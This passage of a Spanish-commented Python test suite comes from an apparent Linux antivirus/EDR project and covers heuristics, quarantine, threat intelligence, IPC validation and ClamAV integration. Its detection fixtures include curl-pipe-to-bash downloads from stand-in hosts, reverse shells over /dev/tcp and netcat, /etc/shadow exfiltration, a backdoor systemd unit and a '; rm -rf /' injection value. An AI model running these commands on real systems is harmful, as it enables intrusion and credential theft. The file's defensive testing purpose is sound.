        mock_notifier = MagicMock()
        guard = HardwareGuard(notifier=mock_notifier, auto_block=True, whitelist=self.whitelist)

        # 1. Proceso en /tmp simulando nombre legítimo 'firefox' (Spoofing)
        fake_firefox = os.path.join(self.tmp, "firefox")
        with open(fake_firefox, "w") as f: f.write("malicious camera sniffer")
        os.chmod(fake_firefox, 0o755)

        ctx = ProcessHardwareContext(pid=os.getpid(), dev_path="/dev/video0", dev_type="Cámara Web")
        ctx.exe_path = fake_firefox
        ctx.comm = "firefox"
        ctx.uid = os.getuid()

        guard._evaluate_authorization(ctx)
        # Debe ser rechazado porque corre desde directorio temporal /tmp y es un ejecutable no registrado
        self.assertFalse(ctx.is_authorized)
        self.assertTrue(any("volátil" in r or "no reconocido" in r for r in ctx.reasons))

        # 2. Bloqueo efectivo de acceso
        mock_kill = MagicMock()
        with patch("os.kill", mock_kill):
            guard.block_unauthorized_access(ctx)
            mock_kill.assert_called_with(os.getpid(), signal.SIGKILL)


    def test_virustotal_sample_preparation_and_sha_verification(self):
        """Verifica que prepare_unlocked_sample descifre con AES-256-GCM y valide el SHA-256."""
        uploader = VirusTotalUploader(vault=self.vault)

        # 1. Crear archivo y ponerlo en cuarentena
        test_payload = os.path.join(self.tmp, "vt_sample.bin")
        payload_data = b"MALWARE_VT_TEST_PAYLOAD_ABC_123"
        expected_sha = hashlib.sha256(payload_data).hexdigest()
        with open(test_payload, "wb") as f:
            f.write(payload_data)

        vid = self.vault.quarantine_file(test_payload, "Test.VirusTotal.Extraction")
        self.assertIsNotNone(vid)

        # 2. Extraer mediante VirusTotalUploader
        res = uploader.prepare_unlocked_sample(vid)
        self.assertIsNotNone(res)
        dest_file, orig_name, sha = res
        self.assertEqual(sha, expected_sha)
        self.assertTrue(os.path.exists(dest_file))

        with open(dest_file, "rb") as f:
            extracted_data = f.read()
        self.assertEqual(extracted_data, payload_data)

        # 3. Verificar que si el payload del baúl es alterado, se rechace la extracción
        payload_file = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
        os.chmod(payload_file, 0o600)
        with open(payload_file, "wb") as f:
            f.write(b"CST_AES256GCM:corrupted_bytes_0000000000000000")
        os.chmod(payload_file, 0o000)

        res_tampered = uploader.prepare_unlocked_sample(vid)
        self.assertIsNone(res_tampered, "Fallo de seguridad: Muestra corrupta no fue rechazada")


    def test_subsystem_health_registry_evaluation(self):
        """Verifica que SubsystemHealthRegistry evalúe estados operativos reales y diferencie degradación/error."""
        registry = SubsystemHealthRegistry(state_file=os.path.join(self.tmp, "test_health.json"))

        # 1. Evaluar con demonio inactivo (debe reportar SERVICE_STOPPED en lugar de verde fijo)
        shields_offline = registry.evaluate_live_shields(
            daemon_running=False,
            ebpf_monitor=EBPFMonitor(),
            ransomware=None,
            phishing=self.phishing
        )
        self.assertEqual(len(shields_offline), 7)
        f_shield = next(s for s in shields_offline if s.id == "fanotify")
        self.assertEqual(f_shield.state, ShieldOperationalState.SERVICE_STOPPED)

        # 2. Guardar estado verificado de demonio y evaluar
        registry.save_daemon_health({
            "fanotify": {"is_active": True, "details": "3 puntos de montaje activos"},
            "ebpf": {"state": "ACTIVE", "details": "Sondas sys_enter_execve activas"},
            "ransomware": {"is_active": True, "details": "Canaries desplegados"},
            "usb": {"is_active": True, "details": "Vigilancia udev"},
            "downloads": {"is_active": True, "details": "Vigilancia inotify"},
            "phishing": {"is_active": True, "details": "Red activa"}
        })

        shields_online = registry.evaluate_live_shields(
            daemon_running=True,
            ebpf_monitor=EBPFMonitor(),
            ransomware=None,
            phishing=self.phishing
        )
        f_online = next(s for s in shields_online if s.id == "fanotify")
        self.assertEqual(f_online.state, ShieldOperationalState.ACTIVE)
        self.assertEqual(f_online.badge_label, "PROTECCIÓN ACTIVA")

        # 3. Comprobar desactivación manual por usuario (DISABLED)
        shields_disabled = registry.evaluate_live_shields(
            daemon_running=True,
            ebpf_monitor=EBPFMonitor(),
            ransomware=None,
            phishing=self.phishing,
            disabled_overrides={"fanotify"}
        )
        f_dis = next(s for s in shields_disabled if s.id == "fanotify")
        self.assertEqual(f_dis.state, ShieldOperationalState.DISABLED)
        self.assertEqual(f_dis.badge_label, "PROTECCIÓN DESACTIVADA")


    def test_network_quarantine_isolation(self):
        """Verifica que NetworkQuarantine contenga procesos agresores y corte sockets."""
        import tempfile
        fake_cgroup = tempfile.mkdtemp()
        try:
            nq = NetworkQuarantine(cgroup_path=fake_cgroup)
            # Proceso 1 o 0 nunca debe ser aislado
            self.assertFalse(nq.isolate_pid(0, terminate=False))
            self.assertFalse(nq.isolate_pid(1, terminate=False))

            # Aislamiento de PID sospechoso (incluso si fuese UID 0)
            self.assertTrue(nq.isolate_pid(99999, terminate=False))
            self.assertIn(99999, nq.quarantined_pids)
            
            # Verificación del estado del cortafuegos
            state = nq.verify_firewall_state()
            self.assertIsInstance(state, dict)
            self.assertIn("quarantined_pids", state)
            self.assertIn(99999, state["quarantined_pids"])

            nq.unbind_pid(99999)
            self.assertNotIn(99999, nq.quarantined_pids)
            nq.cleanup()
        finally:
            if os.path.exists(fake_cgroup):
                shutil.rmtree(fake_cgroup, ignore_errors=True)

    def test_threat_intel_exact_counts_no_fake_numbers(self):
        """Verifica que los conteos de firmas reflejen las filas reales sin números inflados."""
        test_db = os.path.join(self.tmp, "test_intel_exact.db")
        ti = ThreatIntelligence(db_path=test_db)
        # Base vacía antes de semillas
        self.assertEqual(ti.count_hashes(), 0)
        self.assertEqual(ti.count_urls(), 0)
        self.assertNotEqual(ti.count_hashes(), 5248)
        self.assertNotEqual(ti.count_urls(), 1420)

        # Cargar semillas auténticas
        ti.load_seed_data()
        self.assertEqual(ti.count_hashes(), 10)
        self.assertEqual(ti.count_urls(), 7)

    def test_threat_intel_provenance_and_confidence(self):
        """Verifica que los indicadores almacenen fuente, confianza, tags y fecha real."""
        test_db = os.path.join(self.tmp, "test_intel_prov.db")
        ti = ThreatIntelligence(db_path=test_db)
        valid_hash = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
        ti.add_hash(valid_hash, "Trojan.Linux.Test", source="MalwareBazaar", confidence=95, tags="test,linux")

        res = ti.lookup_hash(valid_hash)
        self.assertIsNotNone(res)
        self.assertEqual(res["source"], "MalwareBazaar")
        self.assertEqual(res["confidence"], 95)
        self.assertEqual(res["tags"], "test,linux")
        self.assertGreater(res["first_seen"], 0)

        # Rechazo de hash malformado
        invalid_hash = "not-a-valid-sha256"
        self.assertFalse(ti.add_hash(invalid_hash, "Bad"))
        self.assertIsNone(ti.lookup_hash(invalid_hash))

    def test_threat_intel_false_positive_management(self):
        """Verifica que marcar un falso positivo desactive el indicador sin borrar auditoría."""
        test_db = os.path.join(self.tmp, "test_intel_fp.db")
        ti = ThreatIntelligence(db_path=test_db)
        h = "1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff"
        ti.add_hash(h, "FalseThreat")
        self.assertEqual(ti.count_hashes(), 1)
        self.assertIsNotNone(ti.lookup_hash(h))

        # Marcar falso positivo
        marked = ti.mark_false_positive(h, reason="Valid Enterprise Tool")
        self.assertTrue(marked)
        # Ya no debe dar positivo en consultas activas
        self.assertIsNone(ti.lookup_hash(h))
        self.assertEqual(ti.count_hashes(), 0)


    def test_heuristic_multicapa_shannon_entropy(self):
        """Verifica el cálculo de entropía de Shannon sobre datos uniformes vs aleatorios."""
        eng = MultiLayerHeuristicEngine()
        zero_data = b"\x00" * 1000
        self.assertEqual(eng.calculate_entropy(zero_data), 0.0)

        random_data = bytes([i % 256 for i in range(10000)])
        entropy = eng.calculate_entropy(random_data)
        self.assertGreater(entropy, 7.5)

    def test_heuristic_multicapa_elf_packed_and_symbols(self):
        """Verifica detección estructural de empaquetadores UPX y símbolos de inyección/rootkits."""
        eng = MultiLayerHeuristicEngine(score_threshold=45)
        # Binario ELF sintético con UPX y símbolo sys_call_table
        fake_elf = b"ELF" + (b"\x00" * 40) + b"UPX!" + b"\x00\x00sys_call_table"
        res = eng.analyze_buffer(fake_elf)
        self.assertTrue(res.is_malicious)
        self.assertTrue(res.is_packed)
        self.assertIn("sys_call_table", " ".join(res.reasons))
        self.assertGreaterEqual(res.risk_score, 45)

    def test_heuristic_multicapa_script_obfuscation(self):
        """Verifica detección de técnicas de ofuscación y ejecución en memoria (pipe to bash)."""
        eng = MultiLayerHeuristicEngine(score_threshold=45)
        # Script que descarga y ejecuta en memoria junto con shell interactiva
        suspicious_script = (b"#!/bin/bash\n" + b"curl -sSL http://malicious.org/payload.sh | bash\n" + b"bash -i >& /dev/tcp/1.1.1.1/80 0>&1\n")
        res = eng.analyze_buffer(suspicious_script)
        self.assertTrue(res.is_malicious)
        self.assertGreaterEqual(res.risk_score, 50)
        self.assertEqual(res.threat_category, "Heuristic.Linux.ReverseShell")

    def test_heuristic_5_layers_and_risk_policy(self):
        """
        Verifica la arquitectura heurística P1 de 5 capas y gobernanza de riesgo:
        1. Capa Estática: ELF, secciones, W^X, símbolos, entropía y permisos.
        2. Capa de Firmas: YARA y hashes de reputación.
        3. Capa Heurística: Descarga + ejecución, persistencia (systemd/cron), robo de credenciales (/etc/shadow).
        4. Capa de Reputación: Descuento de riesgo para binarios oficiales del sistema y penalización por /tmp.
        5. Capa de Comportamiento: Canary tripwire de ransomware y reverse shell activa.
        6. Escala de Riesgo y Acción: LOW (Permit), MODERATE (Log), HIGH (Deep Analyze), CRITICAL (Block).
        7. Regla de puntuación no aislada (anti-falsos positivos).
        """
        from core.engine.heuristic_engine import RiskLevel, RiskAction
        eng = MultiLayerHeuristicEngine(score_threshold=50)

        # 1. Capa Heurística: Descarga y ejecución (curl | bash) + robo de credenciales (/etc/shadow)
        script_payload = b"#!/bin/bash\ncurl -sSL https://c2.evil.com/dropper.sh | bash\ncat /etc/shadow > /dev/tcp/1.2.3.4/9999\n"
        res_script = eng.analyze_buffer(script_payload)
        self.assertIn("Estática", res_script.layer_results)
        self.assertIn("Firmas", res_script.layer_results)
        self.assertIn("Heurística", res_script.layer_results)
        self.assertIn("Reputación", res_script.layer_results)
        self.assertIn("Comportamiento", res_script.layer_results)

        # Debe detectar descarga/ejecución y acceso a credenciales
        self.assertGreaterEqual(res_script.layer_results["Heurística"].score, 45)
        self.assertTrue(any("curl" in r.lower() or "descarga" in r.lower() for r in res_script.reasons))
        self.assertTrue(any("shadow" in r.lower() or "credencial" in r.lower() for r in res_script.reasons))

        # 2. Persistencia en systemd y cron
        persistence_script = b"[Unit]\nDescription=Backdoor Service\n[Service]\nExecStart=/tmp/.evil.sh\n[Install]\nWantedBy=/etc/systemd/system/multi-user.target\n"
        res_pers = eng.analyze_buffer(persistence_script, file_path="/etc/systemd/system/backdoor.service")
        self.assertTrue(any("systemd" in r.lower() or "persistencia" in r.lower() for r in res_pers.reasons))

        # 3. Capa de Comportamiento: Detección de Canary Tripwire (Ransomware)
        res_canary = eng.analyze_buffer(
            data=b"ransomware_encrypted_data",
            runtime_context={"canary_tripped": True, "rapid_file_encryption": True}
        )
        self.assertEqual(res_canary.action, RiskAction.BLOCK_AND_ISOLATE)
        self.assertEqual(res_canary.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(res_canary.threat_category, "Heuristic.Linux.Ransomware")

        # 4. Capa de Reputación: Descuento de riesgo para binarios oficiales del sistema
        clean_bin_path = "/bin/ls"
        if os.path.exists(clean_bin_path):
            with open(clean_bin_path, "rb") as f:
                ls_data = f.read(65536)
            res_ls = eng.analyze_buffer(ls_data, file_path=clean_bin_path)
            # El binario oficial no debe ser marcado como malicioso
            self.assertFalse(res_ls.is_malicious)
            self.assertEqual(res_ls.risk_level, RiskLevel.LOW)
            self.assertEqual(res_ls.action, RiskAction.PERMIT_AND_LOG)

        # 5. Escala de Riesgo Graduada:
        # Puntuación No Aislada: alta entropía pura sin otras capas sospechosas no pasa a CRITICAL
        high_entropy_data = bytes([i % 256 for i in range(20000)])
        res_entropy = eng.analyze_buffer(high_entropy_data)
        self.assertNotEqual(res_entropy.action, RiskAction.BLOCK_AND_ISOLATE)
        self.assertIn(res_entropy.risk_level, (RiskLevel.MODERATE, RiskLevel.HIGH))

        # 6. Integración con ScanResult
        scan_res = self.scanner.scan_file(file_path=clean_bin_path if os.path.exists(clean_bin_path) else None)
        self.assertIsNotNone(scan_res.risk_level)
        self.assertIsNotNone(scan_res.risk_action)

    def test_threat_intel_feed_import_and_integrity(self):
        """Verifica el procesamiento de feeds CSV/JSON y el registro de sumas de verificación."""
        test_db = os.path.join(self.tmp, "test_intel_feed.db")
        ti = ThreatIntelligence(db_path=test_db)

        raw_csv = (b"# first_seen,sha256_hash,md5,sha1,reporter,fname,ftype,mime,signature\n" + b"2026-11-04,2222222222222222222222222222222222222222222222222222222222222222,,,,user,test.bin,elf,,Linux.Threat\n")
        added, updated, f_sha = ti.import_feed_data("MalwareBazaar", raw_csv, feed_url="https://bazaar.abuse.ch")
        self.assertEqual(added, 1)
        self.assertTrue(len(f_sha) == 64)
        self.assertEqual(ti.count_hashes(), 1)

        history = ti.get_feed_sync_history()
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]["feed_name"], "MalwareBazaar")
        self.assertEqual(history[0]["status"], "SUCCESS")

    def test_daemon_privilege_reduction_and_security_controls(self):
        """
        Verifica los controles de reducción de privilegios P0:
        1. Aislamiento del motor de escaneo (SandboxedScanWorker) sin privilegios administrativos.
        2. Validación estricta de rutas y argumentos en IPC (Anti-Path Traversal / Anti-Injection).
        3. Hardening de systemd: ProtectHome, ProtectHostname, RestrictSUIDSGID, DevicePolicy.
        4. Acciones Polkit granulares y seguras mediante constantine-helper.
        5. Configuración restrictiva de D-Bus para impedir ejecución arbitraria de comandos.
        """
        # 1. Motor de escaneo con separación de privilegios
        from core.engine.scanner import SandboxedScanWorker
        worker = SandboxedScanWorker()
        uid, gid = worker.unprivileged_uid, worker.unprivileged_gid
        self.assertGreater(uid, 0, "El usuario del worker de escaneo debe ser no privilegiado (UID > 0)")
        self.assertGreater(gid, 0, "El grupo del worker de escaneo debe ser no privilegiado (GID > 0)")

        # Escaneo seguro mediante sandbox worker
        sample_path = os.path.join(self.tmp, "sandbox_test.bin")
        with open(sample_path, "wb") as f:
            f.write(b"safe_test_content_for_scanner")
        res = self.scanner.scan_file(file_path=sample_path)
        self.assertFalse(res.is_malicious)

        # 2. Validación de parámetros IPC
        from core.engine.ipc_protocol import validate_ipc_path, validate_ipc_vault_id
        # Rutas válidas
        ok, norm_p = validate_ipc_path("/var/log/constantine/test.log")
        self.assertTrue(ok)
        self.assertEqual(norm_p, "/var/log/constantine/test.log")

        # Rutas no permitidas (relativas, caracteres nulos, vacías)
        self.assertFalse(validate_ipc_path("../relative/path")[0])
        self.assertFalse(validate_ipc_path("/tmp/evil\x00path")[0])
        self.assertFalse(validate_ipc_path("")[0])
        self.assertFalse(validate_ipc_path(None)[0])

        # IDs de cuarentena válidos vs maliciosos
        self.assertTrue(validate_ipc_vault_id("0123456789abcdef0123456789abcdef"))
        self.assertFalse(validate_ipc_vault_id("../escape"))
        self.assertFalse(validate_ipc_vault_id("; rm -rf /"))
        self.assertFalse(validate_ipc_vault_id("short"))

        # 3. Verificación de hardening en constantine.service
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        with open(service_file, "r") as f:
            svc = f.read()
        self.assertIn("ProtectHome=read-only", svc)
        self.assertIn("ProtectHostname=true", svc)
        self.assertIn("RestrictSUIDSGID=true", svc)
        self.assertIn("DevicePolicy=closed", svc)

        # 4. Verificación de directiva Polkit y helper administrativo
        polkit_file = os.path.join(ROOT_DIR, "service", "org.constantine.antivirus.policy")
        self.assertTrue(os.path.exists(polkit_file))
        with open(polkit_file, "r") as f:
            pol = f.read()
        self.assertIn("org.constantine.antivirus.service.manage", pol)
        self.assertIn("org.constantine.antivirus.quarantine.manage", pol)
        self.assertIn("org.constantine.antivirus.whitelist.manage", pol)
        self.assertIn("org.constantine.antivirus.admin.unlock", pol)
        self.assertIn("org.constantine.antivirus.shield.toggle", pol)
        self.assertIn("org.constantine.antivirus.dns.apply", pol)
        self.assertIn("org.constantine.antivirus.uninstall", pol)
        self.assertIn("constantine-helper", pol)

        helper_file = os.path.join(ROOT_DIR, "service", "constantine-helper")
        self.assertTrue(os.path.exists(helper_file))
        self.assertTrue(os.access(helper_file, os.X_OK), "constantine-helper debe ser ejecutable")

        # 5. Verificación de archivo de configuración D-Bus
        dbus_file = os.path.join(ROOT_DIR, "service", "org.constantine.antivirus.conf")
        self.assertTrue(os.path.exists(dbus_file))
        with open(dbus_file, "r") as f:
            dbus = f.read()
        self.assertIn('<allow own="org.constantine.antivirus"/>', dbus)
        self.assertIn('<deny send_destination="org.constantine.antivirus"/>', dbus)
        self.assertIn('send_member="GetStatus"', dbus)
        self.assertIn('send_member="RequestScan"', dbus)

    def test_systemd_service_isolation_and_hardening(self):
        """Verifica que el servicio systemd implemente NoNewPrivileges, ProtectSystem=strict y capacidades delimitadas."""
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        self.assertTrue(os.path.exists(service_file))

        with open(service_file, "r") as f:
            content = f.read()

        # Directivas obligatorias de hardening de systemd
        self.assertIn("NoNewPrivileges=true", content)
        self.assertIn("ProtectSystem=strict", content)
        self.assertIn("ProtectHome=read-only", content)
        self.assertIn("PrivateTmp=true", content)
        self.assertIn("ProtectKernelTunables=true", content)
        self.assertIn("ProtectKernelModules=true", content)
        self.assertIn("ProtectControlGroups=true", content)
        self.assertIn("RestrictRealtime=true", content)
        self.assertIn("RestrictSUIDSGID=true", content)
        self.assertIn("LockPersonality=true", content)
        self.assertIn("RestrictAddressFamilies=", content)
        self.assertIn("DevicePolicy=closed", content)
        self.assertIn("SystemCallFilter=", content)
        self.assertIn("@system-service", content)
        self.assertIn("SystemCallArchitectures=native", content)
        self.assertIn("CapabilityBoundingSet=", content)
        self.assertIn("CAP_SYS_ADMIN", content)
        self.assertIn("StateDirectory=constantine", content)
        self.assertIn("RuntimeDirectory=constantine", content)
        self.assertIn("ReadWritePaths=", content)
        # Verificar que ReadWritePaths incluya las rutas de cuarentena para evitar conflictos con ProtectSystem=strict
        self.assertIn("/home", content)
        self.assertIn("/tmp", content)
        self.assertIn("/var/tmp", content)
        self.assertIn("/var/lib/constantine", content)


    def test_version_traceability_across_system(self):
        """Hallazgo 04: Garantiza trazabilidad de versiones e inconsistencias eliminadas entre install.sh, GUI y backend."""
        version_file = os.path.join(ROOT_DIR, "VERSION")
        self.assertTrue(os.path.exists(version_file), "El archivo canónico VERSION no existe")
        with open(version_file, "r", encoding="utf-8") as f:
            canonical_ver = f.read().strip()
        self.assertEqual(canonical_ver, "4.3.2")

        from core.engine.auto_updater import CURRENT_VERSION
        from core.engine.ipc_protocol import IPC_PROTOCOL_VERSION
        from core.engine.threat_intel import THREAT_INTEL_VERSION
        from daemon import DAEMON_VERSION
        from gui.app import APP_VERSION

        self.assertEqual(CURRENT_VERSION, canonical_ver, "auto_updater.CURRENT_VERSION no coincide con VERSION")
        self.assertEqual(IPC_PROTOCOL_VERSION, canonical_ver, "ipc_protocol.IPC_PROTOCOL_VERSION no coincide con VERSION")
        self.assertEqual(DAEMON_VERSION, canonical_ver, "daemon.DAEMON_VERSION no coincide con VERSION")
        self.assertEqual(THREAT_INTEL_VERSION, canonical_ver, "threat_intel.THREAT_INTEL_VERSION no coincide con VERSION")
        self.assertEqual(APP_VERSION, canonical_ver, "gui.app.APP_VERSION no coincide con VERSION")

        # Verificar install.sh
        install_file = os.path.join(ROOT_DIR, "install.sh")
        with open(install_file, "r", encoding="utf-8") as f:
            install_content = f.read()

        self.assertIn("VERSION=$(tr -d", install_content, "install.sh debe leer VERSION dinámicamente")
        self.assertIn("Inconsistencia de versión detectada", install_content, "install.sh debe verificar coherencia de VERSION")
        self.assertNotIn("3.6.0", install_content, "install.sh no debe tener referencias obsoletas a 3.6.0")

        # Verificar gui/app.py
        gui_file = os.path.join(ROOT_DIR, "gui", "app.py")
        with open(gui_file, "r", encoding="utf-8") as f:
            gui_content = f.read()

        self.assertNotIn("EDR v3.6", gui_content, "gui/app.py no debe contener etiquetas estáticas EDR v3.6")
        self.assertIn("EDR v{APP_VERSION}", gui_content, "gui/app.py debe usar badge dinámico con APP_VERSION")


    def test_clamav_signature_importer_and_cvd_unpacking(self):
        """Verifica la ingesta de firmas ClamAV (.hsb/.hdb) y el desempaquetado seguro de CVD con protección Zip Slip."""
        from core.engine.clamav_importer import ClamAVSignatureImporter
        importer = ClamAVSignatureImporter()

        # 1. Parseo de líneas .hsb y .hdb
        valid_hsb = "8a39a9c68a4e8d356c9a35e729a996024efb5ef604c86ec6e0bf0a68d067c87c:1024:Linux.Ransomware.LockBit"
        parsed = importer.parse_hsb_line(valid_hsb)
        self.assertIsNotNone(parsed)
        h, s, name = parsed
        self.assertEqual(h, "8a39a9c68a4e8d356c9a35e729a996024efb5ef604c86ec6e0bf0a68d067c87c")
        self.assertEqual(s, 1024)
        self.assertEqual(name, "Linux.Ransomware.LockBit")

        # Línea inválida
        self.assertIsNone(importer.parse_hsb_line("invalid_hash:500:malware"))

        # 2. Ingesta de archivo .hsb a ThreatIntelligence
        hsb_file = os.path.join(self.tmp, "test_signatures.hsb")
        with open(hsb_file, "w") as f:
            f.write("# ClamAV Daily Signatures\n")
            f.write("04c8efb131c94411fb7a641d402db3e47b913d8093db27a2336ecb001d898a39:2048:Trojan.Linux.Dofloo\n")
            f.write("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855:0:Empty.Test.Malware\n")

        added = importer.import_hsb_file(hsb_file, self.scanner.intel)
        self.assertEqual(added, 2)
        match = self.scanner.intel.lookup_hash("04c8efb131c94411fb7a641d402db3e47b913d8093db27a2336ecb001d898a39")
        self.assertIsNotNone(match)
        self.assertIn("Trojan.Linux.Dofloo", match["threat_name"])

        # 3. Creación y desempaquetado de archivo CVD simulado
        import tarfile, io
        tar_buf = io.BytesIO()
        with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
            content_bytes = b"Sample ClamAV content\n"
            ti = tarfile.TarInfo(name="daily.info")
            ti.size = len(content_bytes)
            tar.addfile(ti, io.BytesIO(content_bytes))

        # Cabecera CVD canónica de 512 bytes
        cvd_header = b"ClamAV-VDB:04 Nov 2026 12-00 +0000:27000:100:60:dummy_md5:dummy_sig:builder:sig\n"
        cvd_header = cvd_header.ljust(512, b"\0")
        cvd_path = os.path.join(self.tmp, "daily_test.cvd")
        with open(cvd_path, "wb") as f:
            f.write(cvd_header + tar_buf.getvalue())

        unpack_dest = os.path.join(self.tmp, "unpacked_cvd")
        unpack_res = importer.unpack_cvd(cvd_path, unpack_dest)
        self.assertTrue(unpack_res["success"])
        self.assertIn("daily.info", unpack_res["extracted_files"])
        self.assertTrue(os.path.exists(os.path.join(unpack_dest, "daily.info")))

    def test_clamav_daemon_bridge_protocol_and_fallback(self):
        """Verifica el cliente IPC para el demonio clamd: PING, VERSION, SCAN y tolerancia a fallos."""
        from core.engine.clamav_bridge import ClamAVDaemonClient
        import socket, threading

        # 1. Fallback cuando clamd no está instalado o detenido
        client_offline = ClamAVDaemonClient(socket_path=os.path.join(self.tmp, "nonexistent_clamd.sock"))
        self.assertFalse(client_offline.is_available())
        is_inf, name = client_offline.scan_file("/tmp/any_file")
        self.assertFalse(is_inf)
        self.assertIsNone(name)

        # 2. Servidor Mock que simula el protocolo de clamd
        mock_sock_path = os.path.join(self.tmp, "mock_clamd.sock")
        server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        server_sock.bind(mock_sock_path)
        server_sock.listen(5)

        def mock_clamd_server():
            while True:
                try:
                    conn, _ = server_sock.accept()
                    data = conn.recv(1024).decode("utf-8", errors="ignore")
                    if "PING" in data:
                        conn.sendall(b"PONG\n")
                    elif "VERSION" in data:
                        conn.sendall(b"ClamAV 1.0.5/27018/Wed Nov  4 10:00:00 2026\n")
                    elif "SCAN" in data:
                        if "eicar" in data:
                            conn.sendall(b"/path/eicar.com: Win.Test.EICAR_HDB-1 FOUND\n")
                        else:
                            conn.sendall(b"/path/clean.bin: OK\n")
                    conn.close()
                except Exception:
                    break

        th = threading.Thread(target=mock_clamd_server, daemon=True)
        th.start()
        time.sleep(0.1)

        client_online = ClamAVDaemonClient(socket_path=mock_sock_path)
        self.assertTrue(client_online.ping())
        self.assertTrue(client_online.is_available())
        ver = client_online.get_version()
        self.assertIn("ClamAV 1.0.5", ver)

        # Escaneo de muestra maliciosa
        is_inf, threat = client_online.scan_file("/tmp/eicar.com")
        self.assertTrue(is_inf)
        self.assertEqual(threat, "Win.Test.EICAR_HDB-1")

        # Escaneo de muestra limpia
        is_inf_clean, _ = client_online.scan_file("/tmp/clean.bin")
        self.assertFalse(is_inf_clean)

        server_sock.close()

    def test_archive_sentinel_recursive_inspection_and_zipbomb_protection(self):
        """Verifica el centinela de archivos comprimidos, mitigación de Zip Bombs y detección de amenazas anidadas."""
        from core.engine.archive_sentinel import ArchiveSentinel
        import zipfile

        sentinel = ArchiveSentinel(max_compression_ratio=50.0, max_files=10)

        # 1. Detección de amenaza dentro de un contenedor ZIP legítimo
        zip_path = os.path.join(self.tmp, "nested_malware.zip")
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("benign.txt", "Hola mundo")
            # Simular script malicioso que coincide con regla YARA de netcat reverse shell
            zf.writestr("payload.sh", "#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")

        res = self.scanner.scan_file(file_path=zip_path)
        self.assertTrue(res.is_malicious, "El escáner debió detectar la amenaza dentro del ZIP")
        self.assertIn("Archive.", res.threat_name)

        # 2. Detección de Zip Bomb por ratio desproporcionado de descompresión
        bomb_zip = os.path.join(self.tmp, "zip_bomb.zip")
        with zipfile.ZipFile(bomb_zip, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            # 12 MB de ceros que se comprimen en menos de 15 KB (ratio > 800:1)
            zeros = b"0" * (12 * 1024 * 1024)
            zf.writestr("huge_empty_file.bin", zeros)

        bomb_res = sentinel.inspect_and_scan(bomb_zip, scanner_func=lambda p: (False, None))
        self.assertTrue(bomb_res.is_malicious, "El centinela debió neutralizar la Zip Bomb")
        self.assertEqual(bomb_res.threat_name, "Archive.ZipBomb.DenialOfService")

        # 3. Detección de Zip Bomb por exceso de archivos internos (> max_files)
        many_files_zip = os.path.join(self.tmp, "many_files.zip")
        with zipfile.ZipFile(many_files_zip, "w") as zf:
            for i in range(15):
                zf.writestr(f"file_{i}.txt", f"Contenido {i}")

        many_res = sentinel.inspect_and_scan(many_files_zip, scanner_func=lambda p: (False, None))
        self.assertTrue(many_res.is_malicious)
        self.assertEqual(many_res.threat_name, "Archive.ExcessiveFileCount.DenialOfService")


    def test_proactive_continuous_scanner_and_landing_zones(self):
        """Verifica que el escáner activo continuo audite drop zones y neutralice malware proactivamente."""
        from core.engine.proactive_scanner import ProactiveContinuousScanner
        from core.engine.audit_logger import AuditLogger
        from core.engine.vault import QuarantineVault

        mock_drop = os.path.join(self.tmp, "proactive_drop_zone")
        os.makedirs(mock_drop, exist_ok=True)

        # Archivo limpio
        benign_path = os.path.join(mock_drop, "notes.txt")
        with open(benign_path, "w") as f:
            f.write("Lista de compras y tareas normales.\n")

        # Archivo malicioso (coincide con regla YARA de reverse shell netcat)
        malware_path = os.path.join(mock_drop, "evil_backdoor.sh")
        with open(malware_path, "w") as f:
            f.write("#!/bin/bash\nnc -e /bin/sh 192.168.1.50 9999\n")

        audit_log = AuditLogger(log_path=os.path.join(self.tmp, "audit_proactive.json"))
        vault = self.vault
        notifier = MagicMock()

        proactive = ProactiveContinuousScanner(
            scanner=self.scanner,
            vault=vault,
            notifier=notifier,
            audit_logger=audit_log,
            interval_seconds=1.0,
            target_dirs=[mock_drop]
        )

        proactive.start()
        self.assertTrue(proactive.running)

        # Forzar un barrido proactivo inmediato
        proactive.trigger_immediate_sweep()
        time.sleep(0.5)

        # Verificar que el malware fue aislado del drop zone
        self.assertFalse(os.path.exists(malware_path), "El archivo malicioso debió ser neutralizado y movido al baúl")
        self.assertTrue(os.path.exists(benign_path), "El archivo limpio debe permanecer intacto")

        # Verificar telemetría en tiempo real
        telem = proactive.get_telemetry()
        self.assertEqual(telem["status"], "PROTECTION_ACTIVE_MONITORING")
        self.assertTrue(telem["is_active"])
        self.assertGreaterEqual(telem["files_scanned_count"], 1)
        self.assertGreaterEqual(telem["threats_neutralized_count"], 1)

        # Verificar registro en auditoría
        incidents = audit_log.get_incidents()
        self.assertGreaterEqual(len(incidents), 1)
        self.assertIn("evil_backdoor.sh", incidents[0]["target"])

        proactive.stop()
        self.assertFalse(proactive.running)


    def test_clamav_manager_comprehensive_integration(self):
        """Verifica el gestor integral ClamAV: estado de clamd, firmas actualizables, archivos comprimidos y coordinación on-access."""
        from core.engine.clamav_manager import ClamAVManager
        import socket, threading, zipfile

        # 1. Servidor mock de clamd para validar respuestas de scanning y keepalive
        mock_sock_path = os.path.join(self.tmp, "clamd_mgr_test.sock")
        server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        server_sock.bind(mock_sock_path)
        server_sock.listen(5)

        def mock_server():
            while True:
                try:
                    conn, _ = server_sock.accept()
                    data = conn.recv(1024).decode("utf-8", errors="ignore")
                    if "PING" in data:
                        conn.sendall(b"PONG\n")
                    elif "VERSION" in data:
                        conn.sendall(b"ClamAV 1.0.5/27020/2026\n")
                    elif "SCAN" in data:
                        if "threat" in data:
                            conn.sendall(b"/path/threat.bin: Win.Trojan.Agent-999 FOUND\n")
                        else:
                            conn.sendall(b"/path/clean.bin: OK\n")
                    conn.close()
                except Exception:
                    break

        th = threading.Thread(target=mock_server, daemon=True)
        th.start()
        time.sleep(0.1)

        mgr = ClamAVManager(
            socket_path=mock_sock_path,
